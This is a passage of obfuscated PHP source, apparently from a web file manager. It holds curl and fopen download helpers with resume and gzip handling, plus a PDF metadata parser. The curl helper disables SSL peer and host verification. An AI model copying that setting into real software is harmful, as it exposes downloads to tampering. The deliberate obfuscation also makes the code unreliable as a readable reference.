$FğíÅí‰©™; } else { @unlink($dÚÔ›Èğ© ); @unlink($BšÊéÉ‰éù); $FğíÅí‰©™ = self::fileDownloadCurl($b‰ÇÑƒ½ÒŒ, $BšÊéÉ‰éù, !1, 0, $FÉ‚¯¤ÂÄ×[$D¬†Áâù¢[325]]); @unlink($dÚÔ›Èğ© ); return $FğíÅí‰©™; } } $cÈ”ˆÖ‹¿– = is_file($dÚÔ›Èğ© ) ? filesize($dÚÔ›Èğ© ) : 0; goto aÑ³¿¹¸İ…; AÆÀĞÉÏÕ‚: if ($cÈ”ˆÖ‹¿– > $fÃñ¢î’ÆÖ) { @unlink($dÚÔ›Èğ© ); } file_put_contents($FÇß×º’Éº, json_encode($aº—ĞÆê‚’)); $FğíÅí‰©™ = self::fileDownloadCurl($b‰ÇÑƒ½ÒŒ, $BšÊéÉ‰éù, !0, $cÈ”ˆÖ‹¿–, $fÃñ¢î’ÆÖ); goto böˆÌÕ…÷; aÑ³¿¹¸İ…: $fÃñ¢î’ÆÖ = intval($FÉ‚¯¤ÂÄ×[$D¬†Áâù¢[325]]); if (file_exists($dÚÔ›Èğ© ) && time() - filemtime($dÚÔ›Èğ© ) < 3) { return array($D¬†Áâù¢[1033] => !1, $D¬†Áâù¢[1035] => $D¬†Áâù¢[1518]); } $aº—ĞÆê‚’ = array(); goto A‚Ó³—ôÍİ; cÇ–…ôºáÉ: } static function fileDownloadFopen($a»›á’›®â, $BÁ˜»´®Š¿, $FªÔ±¨è = 0) { $cø¾Œ¥®¨ =& $_SERVER[‚Ğ°–—î]; @ini_set($cø¾Œ¥®¨[1520], $cø¾Œ¥®¨[1521]); $B†òÄÆÑÕÆ = $BÁ˜»´®Š¿ . $cø¾Œ¥®¨[1517]; set_timeout(); @unlink($B†òÄÆÑÕÆ); if ($bìİÊŠÔË = @fopen($a»›á’›®â, $cø¾Œ¥®¨[1522])) { goto BŸÖ…°ô Ÿ; D¢ªÎô¹ó: return array($cø¾Œ¥®¨[1033] => !0, $cø¾Œ¥®¨[1035] => $cø¾Œ¥®¨[695]); goto BŒÊ»³Œéœ; BŸÖ…°ô Ÿ: if (!($AÔ±ŒŸ¾õ = @fopen($B†òÄÆÑÕÆ, $cø¾Œ¥®¨[1523]))) { return array($cø¾Œ¥®¨[1033] => !1, $cø¾Œ¥®¨[1035] => $cø¾Œ¥®¨[1524]); } while (!feof($bìİÊŠÔË)) { if (!file_exists($B†òÄÆÑÕÆ)) { fclose($AÔ±ŒŸ¾õ); return array($cø¾Œ¥®¨[1033] => !1, $cø¾Œ¥®¨[1035] => $cø¾Œ¥®¨[1525]); } clearstatcache(); if ($FªÔ±¨è > 0 && $FªÔ±¨è == filesize(iconv_system($B†òÄÆÑÕÆ))) { break; } fwrite($AÔ±ŒŸ¾õ, fread($bìİÊŠÔË, 1024 * 8), 1024 * 8); } fclose($AÔ±ŒŸ¾õ); goto D¼öĞ§”¨™; D¼öĞ§”¨™: fclose($bìİÊŠÔË); self::checkGzip($B†òÄÆÑÕÆ); if (!@rename($B†òÄÆÑÕÆ, $BÁ˜»´®Š¿)) { usleep(round(rand(0, 1000) * 50)); @unlink($BÁ˜»´®Š¿); $E±ƒèÃä²÷ = @rename($B†òÄÆÑÕÆ, $BÁ˜»´®Š¿); if (!$E±ƒèÃä²÷) { return array($cø¾Œ¥®¨[1033] => !1, $cø¾Œ¥®¨[1035] => $cø¾Œ¥®¨[1526]); } } goto D¢ªÎô¹ó; BŒÊ»³Œéœ: } else { return array($cø¾Œ¥®¨[1033] => !1, $cø¾Œ¥®¨[1035] => $cø¾Œ¥®¨[1527]); } } static function fileDownloadCurl($D¥´²Ğ•Â, $Aò²Õ±æÏƒ, $A¦Ïƒ×Öíã = false, $FÏÆ”³ÀÌÏ = 0, $D¦ëŒ §© = 0) { goto AÜË§è°¾ö; fù²ÉÆõÕ: curl_setopt($Fç·µŸ×ê, CURLOPT_USERAGENT, $F¼ãñì£õã[1521]); $aùØ¿“è­³ = curl_exec($Fç·µŸ×ê); curl_progress_end($Fç·µŸ×ê); goto c£‰¦ßÎ†æ; cˆáˆß½È¸: if ($A¦Ïƒ×Öíã) { curl_setopt($Fç·µŸ×ê, CURLOPT_RANGE, $FÏÆ”³ÀÌÏ . $F¼ãñì£õã[715]); } curl_setopt($Fç·µŸ×ê, CURLOPT_FILE, $CÌã¼éˆÎÛ); curl_setopt($Fç·µŸ×ê, CURLOPT_REFERER, get_url_link($D¥´²Ğ•Â)); goto Dî«êîó…“; c£‰¦ßÎ†æ: curl_close($Fç·µŸ×ê); fclose($CÌã¼éˆÎÛ); $BÛ˜‡ëïÎ˜ = filesize(iconv_system($E¶—Õ“İ„˜)); goto eâš»§æíÎ; b„§ğÃ„´…: curl_setopt($Fç·µŸ×ê, CURLOPT_NOPROGRESS, !1); curl_setopt($Fç·µŸ×ê, CURLOPT_PROGRESSFUNCTION, $F¼ãñì£õã[1529]); curl_progress_start($Fç·µŸ×ê); goto fù²ÉÆõÕ; Dî«êîó…“: curl_setopt($Fç·µŸ×ê, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Fç·µŸ×ê, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Fç·µŸ×ê, CURLOPT_SSL_VERIFYHOST, 0); goto b„§ğÃ„´…; F™İÏ»¯öä: $CÌã¼éˆÎÛ = @fopen($E¶—Õ“İ„˜, $F¼ãñì£õã[981]); if (!$CÌã¼éˆÎÛ) { return array($F¼ãñì£õã[1033] => !1, $F¼ãñì£õã[1035] => $F¼ãñì£õã[1528]); } $Fç·µŸ×ê = curl_init($D¥´²Ğ•Â); goto cˆáˆß½È¸; eâš»§æíÎ: if ($BÛ˜‡ëïÎ˜ < $D¦ëŒ §© && $D¦ëŒ §© != 0) { return array($F¼ãñì£õã[1033] => !1, $F¼ãñì£õã[1035] => $F¼ãñì£õã[1518]); } if ($aùØ¿“è­³ && filesize($E¶—Õ“İ„˜) != 0) { self::checkGzip($E¶—Õ“İ„˜); if (!@rename($E¶—Õ“İ„˜, $Aò²Õ±æÏƒ)) { @unlink($Aò²Õ±æÏƒ); $aùØ¿“è­³ = @rename($E¶—Õ“İ„˜, $Aò²Õ±æÏƒ); if (!$aùØ¿“è­³) { return array($F¼ãñì£õã[1033] => !1, $F¼ãñì£õã[1035] => $F¼ãñì£õã[1530]); } } return array($F¼ãñì£õã[1033] => !0, $F¼ãñì£õã[1035] => $F¼ãñì£õã[695]); } return array($F¼ãñì£õã[1033] => !1, $F¼ãñì£õã[1035] => $F¼ãñì£õã[1531]); goto E•’å„‚½İ; AÜË§è°¾ö: $F¼ãñì£õã =& $_SERVER[‚Ğ°–—î]; $E¶—Õ“İ„˜ = $Aò²Õ±æÏƒ . $F¼ãñì£õã[1517]; set_timeout(); goto F™İÏ»¯öä; E•’å„‚½İ: } static function checkGzip($Fà°×‚»•Ú) { goto D´”¤ê£ë§; e·ô ğÆÎ¸: file_put_contents($Fà°×‚»•Ú, $dÜŸã†«´Š); goto BŸÕÃº¦éº; D´”¤ê£ë§: $Cˆ³ù§»ó = $_SERVER[‚Ğ°–—î][1532]; $C£‘†¼Ã·Æ = file_sub_str($Fà°×‚»•Ú, 0, 2); if ($Cˆ³ù§»ó != $C£‘†¼Ã·Æ) { return; } goto CŒ¨¨À¨¼; CŒ¨¨À¨¼: ob_start(); readgzfile($Fà°×‚»•Ú); $dÜŸã†«´Š = ob_get_clean(); goto e·ô ğÆÎ¸; BŸÕÃº¦éº: } } class FileParsePdf { public static function parse($F÷“Ò­­İ) { goto fìåÁÁŒÄ¯; C–ÑĞ£è£: if ($d…øƒ“†»ì[1] && $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1541]] < $d…øƒ“†»ì[1][0]) { $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1541]] = $d…øƒ“†»ì[1][0]; } $aëô®‰«Ğ‡ = self::parseInfoItem($aëô®‰«Ğ‡); return $aëô®‰«Ğ‡; goto F˜”°´á‚; Aâ§œ‘®÷: preg_match($C÷…¸¶¦§›, $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1535]], $d…øƒ“†»ì); if (!$aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1537]] && count($d…øƒ“†»ì) == 5) { $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1537]] = $d…øƒ“†»ì[3]; $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1539]] = $d…øƒ“†»ì[4]; } preg_match($fÖ½æÈìÕ¡[1540], $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1534]], $d…øƒ“†»ì); goto cè¿¹Ø„©; cè¿¹Ø„©: if ($d…øƒ“†»ì) { $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1343]] = $d…øƒ“†»ì[1]; } $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1541]] = 0; $C÷…¸¶¦§› = $fÖ½æÈìÕ¡[1542]; goto eµ¼ÖÀè¨; A©×¶â•ƒ: if ($b•¾ŠµÉÅ¨) { $C¤¢¿‚¸ÄÚ = $b•¾ŠµÉÅ¨[$fÖ½æÈìÕ¡[1536]][$fÖ½æÈìÕ¡[1192]]; $aëô®‰«Ğ‡ = self::getObjectValue($aó„ì‹Ã†¢, $b•¾ŠµÉÅ¨, $C¤¢¿‚¸ÄÚ); } $aëô®‰«Ğ‡ = is_array($aëô®‰«Ğ‡) ? $aëô®‰«Ğ‡ : array(); $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1537]] = 0; goto AŸ÷‚øá×; fìåÁÁŒÄ¯: $fÖ½æÈìÕ¡ =& $_SERVER[‚Ğ°–—î]; $BëÛø½óŒù = 32 * 1024; $aó„ì‹Ã†¢ = array($fÖ½æÈìÕ¡[776] => fopen($F÷“Ò­­İ, $fÖ½æÈìÕ¡[1170]), $fÖ½æÈìÕ¡[75] => $F÷“Ò­­İ, $fÖ½æÈìÕ¡[77] => filesize($F÷“Ò­­İ), $fÖ½æÈìÕ¡[1533] => $BëÛø½óŒù); goto dğÆµÈ¨´Ö; dğÆµÈ¨´Ö: $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1534]] = StreamWrapperIO::read($F÷“Ò­­İ, 0, $BëÛø½óŒù); $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1535]] = StreamWrapperIO::read($F÷“Ò­­İ, $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[77]] - $BëÛø½óŒù, $BëÛø½óŒù); $b•¾ŠµÉÅ¨ = self::decodeXref($aó„ì‹Ã†¢); goto A©×¶â•ƒ; AŸ÷‚øá×: $C÷…¸¶¦§› = $fÖ½æÈìÕ¡[1538]; preg_match($C÷…¸¶¦§›, $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1534]], $d…øƒ“†»ì); if (!$aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1537]] && count($d…øƒ“†»ì) == 5) { $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1537]] = $d…øƒ“†»ì[3]; $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1539]] = $d…øƒ“†»ì[4]; } goto Aâ§œ‘®÷; eµ¼ÖÀè¨: preg_match_all($C÷…¸¶¦§›, $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1534]], $d…øƒ“†»ì); if ($d…øƒ“†»ì[1] && $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1541]] < $d…øƒ“†»ì[1][0]) { $aëô®‰«Ğ‡[$fÖ½æÈìÕ¡[1541]] = $d…øƒ“†»ì[1][0]; } preg_match_all($C÷…¸¶¦§›, $aó„ì‹Ã†¢[$fÖ½æÈìÕ¡[1535]], $d…øƒ“†»ì); goto C–ÑĞ£è£; F˜”°´á‚: } private static function parseInfoItem($D“¸«Õ¾) { $fÇ¡ƒÂ‘Ö¢ =& $_SERVER[‚Ğ°–—î]; if (!$D“¸«Õ¾) { return !1; } $dä›Áë–¿‚ = array($fÇ¡ƒÂ‘Ö¢[1344] => array($fÇ¡ƒÂ‘Ö¢[1543], $fÇ¡ƒÂ‘Ö¢[33]), $fÇ¡ƒÂ‘Ö¢[1544] => array($fÇ¡ƒÂ‘Ö¢[1545], $fÇ¡ƒÂ‘Ö¢[33]), $fÇ¡ƒÂ‘Ö¢[187] => array($fÇ¡ƒÂ‘Ö¢[1546], $fÇ¡ƒÂ‘Ö¢[210]), $fÇ¡ƒÂ‘Ö¢[107] => array($fÇ¡ƒÂ‘Ö¢[1547], $fÇ¡ƒÂ‘Ö¢[210]), $fÇ¡ƒÂ‘Ö¢[1541] => array($fÇ¡ƒÂ‘Ö¢[1541], $fÇ¡ƒÂ‘Ö¢[276]), $fÇ¡ƒÂ‘Ö¢[1537] => array($fÇ¡ƒÂ‘Ö¢[1537], $fÇ¡ƒÂ‘Ö¢[276]), $fÇ¡ƒÂ‘Ö¢[1539] => array($fÇ¡ƒÂ‘Ö¢[1539], $fÇ¡ƒÂ‘Ö¢[276]), $fÇ¡ƒÂ‘Ö¢[1548] => array($fÇ¡ƒÂ‘Ö¢[1549], $fÇ¡ƒÂ‘Ö¢[33]), $fÇ¡ƒÂ‘Ö¢[1550] => array($fÇ¡ƒÂ‘Ö¢[1551], $fÇ¡ƒÂ‘Ö¢[33]), $fÇ¡ƒÂ‘Ö¢[1552] => array($fÇ¡ƒÂ‘Ö¢[1343], $fÇ¡ƒÂ‘Ö¢[33])); $Càø¥ó©†Ï = array(); foreach ($dä›Áë–¿‚ as $ešêğÌäé± => $Dàù‰ÜãÇ²) { if (!isset($D“¸«Õ¾[$Dàù‰ÜãÇ²[0]])) { continue; } $A‚«Œ¶òŞà = $D“¸«Õ¾[$Dàù‰ÜãÇ²[0]]; if (!$A‚«Œ¶òŞà || is_array($A‚«Œ¶òŞà)) { continue; } switch ($Dàù‰ÜãÇ²[1]) { case $fÇ¡ƒÂ‘Ö¢[276]: $A‚«Œ¶òŞà = intval($A‚«Œ¶òŞà); break; case $fÇ¡ƒÂ‘Ö¢[210]: if (substr($A‚«Œ¶òŞà, 0, 2) == $fÇ¡ƒÂ‘Ö¢[1553]) { $A‚«Œ¶òŞà = substr($A‚«Œ¶òŞà, 2, 14); } if (strtotime($A‚«Œ¶òŞà)) { $A‚«Œ¶òŞà = date($fÇ¡ƒÂ‘Ö¢[1554], strtotime($A‚«Œ¶òŞà)); } break; } $Càø¥ó©†Ï[$ešêğÌäé±] = $A‚«Œ¶òŞà; } return $Càø¥ó©†Ï; } private static function decodeXref(&$cØÈŠÕ™¡Ÿ) { goto DÎÒëîÑ­‚; DÖÄ†Ê‘µ: $aÜ•½”×õ = $C«õ³ôî’Ö[1556]; if (!preg_match_all($aÜ•½”×õ, $fÒ„Š‘ñ‡, $aó½¹¯ÚÕ, PREG_SET_ORDER, 0)) { return !1; } $e„ÅÄ‡“¥æ = intval($aó½¹¯ÚÕ[0][1]); goto A±Š¶Ë»ïª; A½öÖĞšÛ: foreach ($aó½¹¯ÚÕ[3] as $A‚´Óã¶•ç => $B¶Èö‹¼›) { if ($aó½¹¯ÚÕ[3][$A‚´Óã¶•ç] == $C«õ³ôî’Ö[1558]) { $dÂŒ–İãÑ = $Eß¬ùøÓ . $C«õ³ôî’Ö[70] . intval($aó½¹¯ÚÕ[2][$A‚´Óã¶•ç]); $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1555]][$dÂŒ–İãÑ] = intval($aó½¹¯ÚÕ[1][$A‚´Óã¶•ç]); ++$Eß¬ùøÓ; } else { if ($aó½¹¯ÚÕ[3][$A‚´Óã¶•ç] == $C«õ³ôî’Ö[1559]) { ++$Eß¬ùøÓ; } else { } } } if (preg_match_all($C«õ³ôî’Ö[1560], $fÒ„Š‘ñ‡, $aó½¹¯ÚÕ)) { $C©îğ¥æÄê = $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[77]] - $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1533]]; foreach ($aó½¹¯ÚÕ[0] as $A‚´Óã¶•ç => $eÊƒ¼ñ…Ü») { $b›Øî“Ü¿ = $aó½¹¯ÚÕ[1][$A‚´Óã¶•ç] . $C«õ³ôî’Ö[70] . $aó½¹¯ÚÕ[2][$A‚´Óã¶•ç]; $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1555]][$b›Øî“Ü¿] = strpos($fÒ„Š‘ñ‡, $eÊƒ¼ñ…Ü») + $C©îğ¥æÄê + 1; } } if (preg_match_all($C«õ³ôî’Ö[1561], $fÒ„Š‘ñ‡, $aó½¹¯ÚÕ)) { $e­îÓºùª = count($aó½¹¯ÚÕ[1]) == 1 ? $aó½¹¯ÚÕ[1][0] : $aó½¹¯ÚÕ[1][1]; } else { $e­îÓºùª = substr($fÒ„Š‘ñ‡, -1024 * 5); } goto fçÙƒ„Ö†Ş; fçÙƒ„Ö†Ş: if (preg_match($C«õ³ôî’Ö[1562], $e­îÓºùª, $aó½¹¯ÚÕ) > 0) { $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[77]] = intval($aó½¹¯ÚÕ[1]); } if (preg_match($C«õ³ôî’Ö[1563], $e­îÓºùª, $aó½¹¯ÚÕ) > 0) { $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[1564]] = intval($aó½¹¯ÚÕ[1]) . $C«õ³ôî’Ö[70] . intval($aó½¹¯ÚÕ[2]); } if (preg_match($C«õ³ôî’Ö[1565], $e­îÓºùª, $aó½¹¯ÚÕ) > 0) { $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[1566]] = intval($aó½¹¯ÚÕ[1]) . $C«õ³ôî’Ö[70] . intval($aó½¹¯ÚÕ[2]); } goto B…Éßˆš§; e™ŒÉºˆ”: if (preg_match($C«õ³ôî’Ö[1569], $e­îÓºùª, $aó½¹¯ÚÕ) > 0) { } return $E²Ù¾«‹Æ‡; goto b¶š¿¥‘†·; A±Š¶Ë»ïª: if ($cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[77]] - $e„ÅÄ‡“¥æ > $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1533]]) { $DÈ‡„„•ÆÑ = 4 * $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1533]]; $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1533]] = $DÈ‡„„•ÆÑ; $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1534]] = StreamWrapperIO::read($cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[75]], 0, $DÈ‡„„•ÆÑ); $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1535]] = StreamWrapperIO::read($cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[75]], $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[77]] - $DÈ‡„„•ÆÑ, $DÈ‡„„•ÆÑ); $fÒ„Š‘ñ‡ = $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1535]]; } $Eß¬ùøÓ = 0; preg_match_all($C«õ³ôî’Ö[1557], $fÒ„Š‘ñ‡, $aó½¹¯ÚÕ); goto A½öÖĞšÛ; DÎÒëîÑ­‚: $C«õ³ôî’Ö =& $_SERVER[‚Ğ°–—î]; $fÒ„Š‘ñ‡ = $cØÈŠÕ™¡Ÿ[$C«õ³ôî’Ö[1535]]; $E²Ù¾«‹Æ‡ = array($C«õ³ôî’Ö[1536] => array(), $C«õ³ôî’Ö[1555] => array()); goto DÖÄ†Ê‘µ; B…Éßˆš§: if (preg_match($C«õ³ôî’Ö[1567], $e­îÓºùª, $aó½¹¯ÚÕ) > 0) { $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[1192]] = intval($aó½¹¯ÚÕ[1]) . $C«õ³ôî’Ö[70] . intval($aó½¹¯ÚÕ[2]); } if (preg_match($C«õ³ôî’Ö[1568], $e­îÓºùª, $aó½¹¯ÚÕ) > 0) { $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[367]] = array(); $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[367]][0] = $aó½¹¯ÚÕ[1]; $E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[367]][1] = $aó½¹¯ÚÕ[2]; } if (!$E²Ù¾«‹Æ‡[$C«õ³ôî’Ö[1536]][$C«õ³ôî’Ö[1192]]) { return !1; } goto e™ŒÉºˆ”; b¶š¿¥‘†·: } private static function getObjectValue($BÚºÅÍºË», $dŠ™À‘ÔŒ, $B÷òò¶ƒçÙ) { goto Cßé¥åÔ¨ª; Cßé¥åÔ¨ª: $f’ğëŞÓ¶ß =& $_SERVER[‚Ğ°–—î]; $aÒ‹£ÎÇ» = self::getObject($BÚºÅÍºË», $dŠ™À‘ÔŒ[$f’ğëŞÓ¶ß[1555]][$B÷òò¶ƒçÙ]); if (is_string($aÒ‹£ÎÇ»[1])) { return $aÒ‹£ÎÇ»[1]; } goto EŒÚñ—áîÌ; A±Õß¬Ê©Š: return $aˆ¨ßË¾æ; goto d­Ñí³ó“; EŒÚñ—áîÌ: if (!is_array($aÒ‹£ÎÇ»[1])) { return array(); } $aˆ¨ßË¾æ = array(); for ($e˜ÖŠäÂÓ™ = 0; $e˜ÖŠäÂÓ™ < count($aÒ‹£ÎÇ»[1]); $e˜ÖŠäÂÓ™ += 2) { $CÁó§Š‡ë‰ = $aÒ‹£ÎÇ»[1][$e˜ÖŠäÂÓ™]; $FïëÏ‚Óöä = $aÒ‹£ÎÇ»[1][$e˜ÖŠäÂÓ™ + 1]; if (count($CÁó§Š‡ë‰) == 3 && $CÁó§Š‡ë‰[0] == $f’ğëŞÓ¶ß[8]) { $bªÎ­Ú¦½Ê = !1; if ($FïëÏ‚Óöä[0] == $f’ğëŞÓ¶ß[1570]) { $FïëÏ‚Óöä = self::getObject($BÚºÅÍºË», $dŠ™À‘ÔŒ[$f’ğëŞÓ¶ß[1555]][$FïëÏ‚Óöä[1]]); } $bªÎ­Ú¦½Ê = $FïëÏ‚Óöä[1]; if ($bªÎ­Ú¦½Ê === !1) { continue; } if (is_string($bªÎ­Ú¦½Ê)) { $bªÎ­Ú¦½Ê = self::decodeStr($bªÎ­Ú¦½Ê); } $aˆ¨ßË¾æ[$CÁó§Š‡ë‰[1]] = $bªÎ­Ú¦½Ê; } } goto A±Õß¬Ê©Š; d­Ñí³ó“: } private static function getObject($fÆÖâÑ‚Ğ, $d¼—ÑËªš) { $d­ä–§¯ŸÒ = self::getObjectItem($fÆÖâÑ‚Ğ, $d¼—ÑËªš); $d­ä–§¯ŸÒ = self::getObjectItem($fÆÖâÑ‚Ğ, $d­ä–§¯ŸÒ[2]); return $d­ä–§¯ŸÒ; } private static function getObjectItem($E¤…¸éÍ¤Ì, $A‰›¦§½àÔ) { goto d‡º™åÑ”Š; aÈ½ØäÄ°µ: $d³ê¼×Õî = self::getRawObject($F“¹‡é÷Ü, $A´´ö¡§›”); if ($A‰›¦§½àÔ >= $E§ÆÚàé¿‚) { $d³ê¼×Õî[2] = $d³ê¼×Õî[2] + $E§ÆÚàé¿‚; } else { if ($A‰›¦§½àÔ > $e¶Ûöòó­ && $A‰›¦§½àÔ <= $E§ÆÚàé¿‚) { $d³ê¼×Õî[2] = $d³ê¼×Õî[2] + $A‰›¦§½àÔ; } } return $d³ê¼×Õî; goto DÚ§¨°äÌâ; d‡º™åÑ”Š: $E¾‚¬Ÿ³¸ =& $_SERVER[‚Ğ°–—î]; $e¶Ûöòó­ = $E¤…¸éÍ¤Ì[$E¾‚¬Ÿ³¸[1533]]; $E§ÆÚàé¿‚ = $E¤…¸éÍ¤Ì[$E¾‚¬Ÿ³¸[77]] - $e¶Ûöòó­; goto CÀâƒÁäå; CÀâƒÁäå: $A´´ö¡§›” = $A‰›¦§½àÔ >= $E§ÆÚàé¿‚ ? $A‰›¦§½àÔ - $E§ÆÚàé¿‚ : $A‰›¦§½àÔ; $F“¹‡é÷Ü = $A‰›¦§½àÔ >= $E§ÆÚàé¿‚ ? $E¤…¸éÍ¤Ì[$E¾‚¬Ÿ³¸[1535]] : $E¤…¸éÍ¤Ì[$E¾‚¬Ÿ³¸[1534]]; if ($A‰›¦§½àÔ > $e¶Ûöòó­ && $A‰›¦§½àÔ <= $E§ÆÚàé¿‚) { $A´´ö¡§›” = 0; $F“¹‡é÷Ü = StreamWrapperIO::read($E¤…¸éÍ¤Ì[$E¾‚¬Ÿ³¸[75]], $A‰›¦§½àÔ, $e¶Ûöòó­); } goto aÈ½ØäÄ°µ; DÚ§¨°äÌâ: } private static function decodeStr($eœŸ±¥®Á) { goto EÛåòîÃÅ; FŞ¾½Û‹…†: return $eœŸ±¥®Á; goto e…Ö„À¼Ï; EÛåòîÃÅ: $AÙ‡ÏƒŠ„Ü =& $_SERVER[‚Ğ°–—î]; $eœŸ±¥®Á = str_replace(array($AÙ‡ÏƒŠ„Ü[1571], $AÙ‡ÏƒŠ„Ü[1572], $AÙ‡ÏƒŠ„Ü[1573], $AÙ‡ÏƒŠ„Ü[1574], $AÙ‡ÏƒŠ„Ü[1575], $AÙ‡ÏƒŠ„Ü[1576], $AÙ‡ÏƒŠ„Ü[1577], $AÙ‡ÏƒŠ„Ü[1578]), array($AÙ‡ÏƒŠ„Ü[93], $AÙ‡ÏƒŠ„Ü[50], $AÙ‡ÏƒŠ„Ü[8], $AÙ‡ÏƒŠ„Ü[248], $AÙ‡ÏƒŠ„Ü[817], $AÙ‡ÏƒŠ„Ü[217], $AÙ‡ÏƒŠ„Ü[993], $AÙ‡ÏƒŠ„Ü[330]), $eœŸ±¥®Á); $D¼öŠÚİğ§ = preg_split($AÙ‡ÏƒŠ„Ü[1579], $eœŸ±¥®Á, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto AÊà°âØ«ø; F×ˆ±¿“: $eœŸ±¥®Á = $AÙ‡ÏƒŠ„Ü[33]; foreach ($D¼öŠÚİğ§ as $aÎİğšĞÍš) { if (preg_match($AÙ‡ÏƒŠ„Ü[1585], $aÎİğšĞÍš) && !1 === stripos($aÎİğšĞÍš, $AÙ‡ÏƒŠ„Ü[1586])) { $aÎİğšĞÍš = preg_replace($AÙ‡ÏƒŠ„Ü[1587], $AÙ‡ÏƒŠ„Ü[33], $aÎİğšĞÍš); $aÎİğšĞÍš = trim($aÎİğšĞÍš, $AÙ‡ÏƒŠ„Ü[927]); $aÎİğšĞÍš = pack($AÙ‡ÏƒŠ„Ü[1588], $aÎİğšĞÍš); $eœŸ±¥®Á .= $aÎİğšĞÍš; } else { $eœŸ±¥®Á .= $aÎİğšĞÍš; } } if (preg_match($AÙ‡ÏƒŠ„Ü[1589], $eœŸ±¥®Á)) { $A‚Šââêß„ = substr($eœŸ±¥®Á, 2); $eœŸ±¥®Á = $AÙ‡ÏƒŠ„Ü[33]; $D¡â¹ßÅ×Ë = strlen($A‚Šââêß„); for ($C‡Îëì†™Ì = 0; $C‡Îëì†™Ì < $D¡â¹ßÅ×Ë; $C‡Îëì†™Ì += 2) { $eøÁÁÙ©“Ø = hexdec(bin2hex(substr($A‚Šââêß„, $C‡Îëì†™Ì, 2))); $eœŸ±¥®Á .= mb_convert_encoding($AÙ‡ÏƒŠ„Ü[1590] . intval($eøÁÁÙ©“Ø) . $AÙ‡ÏƒŠ„Ü[67], $AÙ‡ÏƒŠ„Ü[1591], $AÙ‡ÏƒŠ„Ü[1592]); } } goto FŞ¾½Û‹…†; F—†íÏÈ: $eœŸ±¥®Á = $AÙ‡ÏƒŠ„Ü[33]; foreach ($D¼öŠÚİğ§ as $aÎİğšĞÍš) { if (preg_match($AÙ‡ÏƒŠ„Ü[1582], $aÎİğšĞÍš)) { $eœŸ±¥®Á .= \chr(hexdec(trim($aÎİğšĞÍš, $AÙ‡ÏƒŠ„Ü[1583]))); } else { $eœŸ±¥®Á .= $aÎİğšĞÍš; } } $D¼öŠÚİğ§ = preg_split($AÙ‡ÏƒŠ„Ü[1584], $eœŸ±¥®Á, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto F×ˆ±¿“; AÊà°âØ«ø: $eœŸ±¥®Á = $AÙ‡ÏƒŠ„Ü[33]; foreach ($D¼öŠÚİğ§ as $aÎİğšĞÍš) { if (preg_match($AÙ‡ÏƒŠ„Ü[1580], $aÎİğšĞÍš)) { $eœŸ±¥®Á .= \chr(octdec(trim($aÎİğšĞÍš, $AÙ‡ÏƒŠ„Ü[93]))); } else { $eœŸ±¥®Á .= $aÎİğšĞÍš; } } $D¼öŠÚİğ§ = preg_split($AÙ‡ÏƒŠ„Ü[1581], $eœŸ±¥®Á, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto F—†íÏÈ; e…Ö„À¼Ï: } private static function getRawObject($e„Û©àÕÁ™, $f­ù”Ì„¾… = 0) { goto FîÑ‰Ç«…; B™‚àÓÌ©: $f­ù”Ì„¾… += strspn($e„Û©àÕÁ™, $A¡ôÄ–©Ó¡[1593], $f­ù”Ì„¾…); $dÔÜŞº‘Èİ = $e„Û©àÕÁ™[$f­ù”Ì„¾…]; switch ($dÔÜŞº‘Èİ) { case $A¡ôÄ–©Ó¡[1594]: $cØßõ¶µ¤ = strcspn($e„Û©àÕÁ™, $A¡ôÄ–©Ó¡[1595], $f­ù”Ì„¾…); if ($cØßõ¶µ¤ > 0) { $f­ù”Ì„¾… += $cØßõ¶µ¤; return self::getRawObject($e„Û©àÕÁ™, 